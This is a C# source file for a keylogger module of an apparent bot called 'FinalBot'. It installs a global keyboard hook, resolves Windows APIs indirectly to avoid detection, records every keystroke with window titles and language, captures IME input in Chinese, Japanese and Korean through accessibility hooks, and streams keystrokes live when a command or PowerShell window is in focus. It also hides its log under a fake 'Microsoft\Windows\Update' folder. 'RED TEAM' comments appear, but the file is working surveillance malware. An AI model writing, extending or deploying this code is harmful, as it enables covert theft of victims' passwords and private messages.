using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;

namespace FinalBot.Modules
{
    public static class KeyloggerModule
    {
        private const int _hType = 13; // WH_KEYBOARD_LL
        private const int _kDown = 0x0100; // WM_KEYDOWN
        private static LkProc _cb = HookCallback;
        private static IntPtr _hID = IntPtr.Zero;
        private static IntPtr _hEventHook = IntPtr.Zero;
        private static WinEventDelegate _eventCb = WinEventProc;
        private static IntPtr _lastLayout = IntPtr.Zero;
        private static string _lastTitle = "";
        private static bool _isTerminalActive = false;
        private static string _lastFullText = "";

        public delegate void TerminalFocusHandler(string title, bool isActive);
        public static event TerminalFocusHandler? OnTerminalFocus;
        public delegate void KeyStrokeHandler(string key);
        public static event KeyStrokeHandler? OnKeyStroke;
        public static bool IsTerminalActive => _isTerminalActive;
        private static bool _started = false; // Prevent thread leakage

        private delegate IntPtr LkProc(int n, IntPtr w, IntPtr l);

        private static class Native
        {
            public static SetHookDelegate? SetHook => VanguardCore.SafetyManager.ApiInterface.Get<SetHookDelegate>("SetWindowsHookExW");
            public static UnhookDelegate? Unhook => VanguardCore.SafetyManager.ApiInterface.Get<UnhookDelegate>("UnhookWindowsHookEx");
            public static CallNextDelegate? CallNext => VanguardCore.SafetyManager.ApiInterface.Get<CallNextDelegate>("CallNextHookEx");
            public static GetModDelegate? GetMod => VanguardCore.SafetyManager.ApiInterface.Get<GetModDelegate>("GetModuleHandleW");
            public static GetMsgDelegate? GetMsg => VanguardCore.SafetyManager.ApiInterface.Get<GetMsgDelegate>("GetMessageW");
            public static TransMsgDelegate? TransMsg => VanguardCore.SafetyManager.ApiInterface.Get<TransMsgDelegate>("TranslateMessage");
            public static DispMsgDelegate? DispMsg => VanguardCore.SafetyManager.ApiInterface.Get<DispMsgDelegate>("DispatchMessageW");

            // Keyboard Layout Support
            public static GetForegroundDelegate? GetForeground => VanguardCore.SafetyManager.ApiInterface.Get<GetForegroundDelegate>("GetForegroundWindow");
            public static GetWindowThreadProcessIdDelegate? GetThreadProcess => VanguardCore.SafetyManager.ApiInterface.Get<GetWindowThreadProcessIdDelegate>("GetWindowThreadProcessId");
            public static GetLayoutDelegate? GetLayout => VanguardCore.SafetyManager.ApiInterface.Get<GetLayoutDelegate>("GetKeyboardLayout");
            public static GetKeyStateDelegate? GetKeyState => VanguardCore.SafetyManager.ApiInterface.Get<GetKeyStateDelegate>("GetKeyState");
            public static ToUnicodeExDelegate? ToUnicode => VanguardCore.SafetyManager.ApiInterface.Get<ToUnicodeExDelegate>("ToUnicodeEx");
            public static GetWindowTextDelegate? GetText => VanguardCore.SafetyManager.ApiInterface.Get<GetWindowTextDelegate>("GetWindowTextW");

            // WinEvent & Accessibility Support
            public static SetEventHookDelegate? SetEventHook => VanguardCore.SafetyManager.ApiInterface.Get<SetEventHookDelegate>("SetWinEventHook");
            public static UnhookEventDelegate? UnhookEvent => VanguardCore.SafetyManager.ApiInterface.Get<UnhookEventDelegate>("UnhookWinEvent");
            public static AccFromEventDelegate? AccFromEvent {
                get {
                    IntPtr ptr = VanguardCore.SafetyManager.ApiInterface.Resolve("oleacc.dll", "AccessibleObjectFromEvent");
                    return ptr != IntPtr.Zero ? Marshal.GetDelegateForFunctionPointer<AccFromEventDelegate>(ptr) : null;
                }
            }
        }

        private delegate IntPtr GetForegroundDelegate();
        private delegate uint GetWindowThreadProcessIdDelegate(IntPtr hWnd, out uint lpdwProcessId);
        private delegate IntPtr GetLayoutDelegate(uint dwThreadId);
        private delegate short GetKeyStateDelegate(int nVirtKey);
        private delegate int ToUnicodeExDelegate(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
        private delegate int GetWindowTextDelegate(IntPtr hWnd, [Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder lpString, int nMaxCount);

        private delegate IntPtr SetEventHookDelegate(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);
        private delegate bool UnhookEventDelegate(IntPtr hWinEventHook);
        private delegate int AccFromEventDelegate(IntPtr hwnd, uint idObject, uint idChild, out IAccessible ppvObject, out object pvarChild);
        private delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);

        [ComImport, Guid("618730e0-3c3d-11cf-810c-00aa00389b71"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        private interface IAccessible
        {
            void _VtblSlot1(); void _VtblSlot2(); void _VtblSlot3(); void _VtblSlot4(); void _VtblSlot5(); void _VtblSlot6(); void _VtblSlot7(); void _VtblSlot8();
            [PreserveSig] int get_accName(object varChild, out string pszName);
            [PreserveSig] int get_accValue(object varChild, out string pszValue);
        }

        private delegate IntPtr SetHookDelegate(int id, LkProc lpfn, IntPtr hMod, uint dwThreadId);
        private delegate bool UnhookDelegate(IntPtr hhk);
        private delegate IntPtr CallNextDelegate(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        private delegate IntPtr GetModDelegate(string lpModuleName);
        private delegate int GetMsgDelegate(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);
        private delegate bool TransMsgDelegate([In] ref MSG lpMsg);
        private delegate IntPtr DispMsgDelegate([In] ref MSG lpMsg);

        [StructLayout(LayoutKind.Sequential)]
        private struct MSG
        {
            public IntPtr hwnd;
            public uint message;
            public IntPtr wParam;
            public IntPtr lParam;
            public uint time;
            public POINT pt;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct POINT
        {
            public int x;
            public int y;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT 
        {
            public uint vkCode;
            public uint scanCode;
            public uint flags;
            public uint time;
            public IntPtr dwExtraInfo;
        }

        public static void Start()
        {
            System.Threading.Tasks.Task.Run(() =>
            {
                try
                {
                    _hID = SetHook(_cb);
                    if (_hID == IntPtr.Zero) return;

                    // Initialize Deep Capture Hook (Global window value changes)
                    _hEventHook = Native.SetEventHook?.Invoke(0x800E, 0x800E, IntPtr.Zero, _eventCb, 0, 0, 0) ?? IntPtr.Zero;

                    MSG msg;
                    var getMsg = Native.GetMsg;
                    var transMsg = Native.TransMsg;
                    var dispMsg = Native.DispMsg;

                    if (getMsg == null || transMsg == null || dispMsg == null) return;

                    while (getMsg(out msg, IntPtr.Zero, 0, 0) != 0)
                    {
                        transMsg(ref msg);
                        dispMsg(ref msg);
                    }
                }
                catch (Exception ex)
                {
                    DebugLog($"[KEYLOGGER ERROR] {ex.Message}");
                }
            });
        }

        public static void Stop()
        {
            try
            {
                if (_hID != IntPtr.Zero)
                {
                    Native.Unhook?.Invoke(_hID);
                    _hID = IntPtr.Zero;
                }
                if (_hEventHook != IntPtr.Zero)
                {
                    Native.UnhookEvent?.Invoke(_hEventHook);
                    _hEventHook = IntPtr.Zero;
                }
            }
            catch { }
        }

        private static void DebugLog(string msg)
        {
            try {
                string line = $"[{DateTime.Now:HH:mm:ss}] [KEYLOGGER] {msg}";
                string logDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update");
                if (!Directory.Exists(logDir)) Directory.CreateDirectory(logDir);
                File.AppendAllText(Path.Combine(logDir, "svc_debug.log"), line + Environment.NewLine);
            } catch { }
        }

        private static IntPtr SetHook(LkProc proc)
        {
            try
            {
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule? curModule = curProcess.MainModule)
                {
                    if (curModule == null) return IntPtr.Zero;
                    var setHook = Native.SetHook;
                    var getMod = Native.GetMod;
                    if (setHook == null || getMod == null) return IntPtr.Zero;

                    return setHook(_hType, proc, getMod(curModule.ModuleName), 0);
                }
            }
            catch { return IntPtr.Zero; }
        }

        private static IntPtr HookCallback(int n, IntPtr w, IntPtr l)
        {
            try
            {
                if (n >= 0 && w == (IntPtr)_kDown)
                {
                    KBDLLHOOKSTRUCT? kbd = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(l);
                    if (kbd.HasValue)
                    {
                        // RED TEAM OPTIMIZATION: Instant hand-off to background task
                        // We must NOT perform any I/O or heavy API calls in this thread.
                        uint vkCode = kbd.Value.vkCode;
                        uint scanCode = kbd.Value.scanCode;

                        Task.Run(() => {
                            try {
                                MonitorWindowChange();
                                DetectLayoutChange();
                                string keyName = GetKeyName(vkCode, scanCode);
                                
                                // Local log (Now async via Logger 2.0)
                                Logger.Log(keyName, "KEY");
                                
                                // Direct stream if terminal active
                                OnKeyStroke?.Invoke(keyName);
                            } catch { }
                        });
                    }
                }
            }
            catch { }
            
            var callNext = Native.CallNext;
            return callNext != null ? callNext(_hID, n, w, l) : CallNextHookEx_Fallback(_hID, n, w, l);
        }

        private static void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
        {
            try
            {
                // Only trigger Deep Capture for CJK languages or if it's an IME commit
                if (_lastLayout == IntPtr.Zero) return;
                int langId = (int)((long)_lastLayout & 0xFFFF);
                bool isCJK = langId == 0x0804 || langId == 0x0404 || langId == 0x0411 || langId == 0x0412; // ZH, JA, KO
                
                if (!isCJK) return;

                var accFromEvent = Native.AccFromEvent;
                if (accFromEvent == null) return;

                IAccessible accObj;
                object childId;
                if (accFromEvent(hwnd, (uint)idObject, (uint)idChild, out accObj, out childId) == 0)
                {
                    string newVal;
                    if (accObj.get_accValue(childId, out newVal) == 0 && !string.IsNullOrEmpty(newVal))
                    {
                        // Identify only the NEW characters added to the end (typical IME behavior)
                        if (newVal.Length > _lastFullText.Length && newVal.StartsWith(_lastFullText))
                        {
                            string delta = newVal.Substring(_lastFullText.Length);
                            if (delta.Any(c => c > 127)) // Only log if contains non-ASCII (meaning IME conversion)
                            {
                                Logger.Log($" [Deep captured: {delta}] ", "KEY");
                            }
                        }
                        _lastFullText = newVal;
                    }
                }
            }
            catch { }
        }

        // Fallback or explicit call
        private static IntPtr CallNextHookEx_Fallback(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam) => IntPtr.Zero;

        private static string GetKeyName(uint vkCode, uint scanCode)
        {
            switch (vkCode)
            {
                case 0x08: return "[BACKSPACE]";
                case 0x09: return "[TAB]";
                case 0x0D: return "[ENTER]\n";
                case 0x10: return "[SHIFT]";
                case 0x11: return "[CTRL]";
                case 0x12: return "[ALT]";
                case 0x14: return "[CAPS]";
                case 0x1B: return "[ESC]";
                case 0x20: return " ";
                case 0x2E: return "[DEL]";
                case 0x25: return "[LEFT]";
                case 0x26: return "[UP]";
                case 0x27: return "[RIGHT]";
                case 0x28: return "[DOWN]";
            }

            try
            {
                var toUnicode = Native.ToUnicode;
                var getKeyState = Native.GetKeyState;
                var getForeground = Native.GetForeground;
                var getThreadProcess = Native.GetThreadProcess;
                var getLayout = Native.GetLayout;

                if (toUnicode != null && getKeyState != null)
                {
                    // RED TEAM: Capture manual keyboard state because GetKeyboardState() fails in Tasks
                    byte[] kbState = new byte[256];
                    
                    // Essential modifiers for Unicode mapping
                    if ((getKeyState(0x10) & 0x80) != 0) kbState[0x10] = 0x80; // Shift
                    if ((getKeyState(0x11) & 0x80) != 0) kbState[0x11] = 0x80; // Ctrl
                    if ((getKeyState(0x12) & 0x80) != 0) kbState[0x12] = 0x80; // Alt
                    if ((getKeyState(0x14) & 0x01) != 0) kbState[0x14] = 0x01; // CapsLock (Toggled)
                    if ((getKeyState(0x90) & 0x01) != 0) kbState[0x90] = 0x01; // NumLock

                    IntPtr foreground = getForeground?.Invoke() ?? IntPtr.Zero;
                    uint procId;
                    uint threadId = getThreadProcess != null ? getThreadProcess(foreground, out procId) : 0;
                    IntPtr layout = getLayout != null ? getLayout(threadId) : IntPtr.Zero;

                    var sb = new System.Text.StringBuilder(16);
                    int result = toUnicode(vkCode, scanCode, kbState, sb, sb.Capacity, 0, layout);
                    
                    if (result > 0) return sb.ToString();
                    if (result == -1) // Dead key (combination)
                    {
                        // Clean up internal buffer to prevent artifacts
                        toUnicode(vkCode, scanCode, kbState, sb, sb.Capacity, 0, layout);
                    }
                }
            }
            catch { }

            return $"[VK:{vkCode:X2}]";
        }

        private static void DetectLayoutChange()
        {
            try
            {
                IntPtr foreground = Native.GetForeground?.Invoke() ?? IntPtr.Zero;
                uint procId;
                uint threadId = Native.GetThreadProcess != null ? Native.GetThreadProcess(foreground, out procId) : 0;
                IntPtr layout = Native.GetLayout != null ? Native.GetLayout(threadId) : IntPtr.Zero;

                if (layout != _lastLayout)
                {
                    _lastLayout = layout;
                    string langName = "??";
                    try
                    {
                        // Extract lower 16 bits (Language ID) from HKL
                        int langId = (int)((long)layout & 0xFFFF);
                        var culture = new System.Globalization.CultureInfo(langId);
                        
                        // Clear text selection buffer on layout change to prevent stale diffs
                        _lastFullText = ""; 

                        // Use EnglishName for full professional clarity (e.g., Chinese (Simplified, China))
                        langName = culture.EnglishName;
                        if (string.IsNullOrEmpty(langName)) langName = culture.Name.ToUpper();
                    }
                    catch { }
                    Logger.Log($"\n[LANGUAGE: {langName}] ", "KEY");
                }
            }
            catch { }
        }

        private static void MonitorWindowChange()
        {
            try
            {
                IntPtr hwnd = Native.GetForeground?.Invoke() ?? IntPtr.Zero;
                if (hwnd == IntPtr.Zero) return;

                var sb = new System.Text.StringBuilder(256);
                Native.GetText?.Invoke(hwnd, sb, 256);
                string title = sb.ToString();

                if (title != _lastTitle)
                {
                    _lastTitle = title;
                    Logger.Log($"\n[WINDOW: {title}] ", "KEY");

                    string lower = title.ToLower();
                    bool isTerminal = lower.Contains("cmd") || lower.Contains("powershell") || lower.Contains("командная") || lower.Contains("терминал");

                    if (isTerminal != _isTerminalActive)
                    {
                        _isTerminalActive = isTerminal;
                        OnTerminalFocus?.Invoke(title, isTerminal);
                    }
                }
            }
            catch { }
        }
    }
}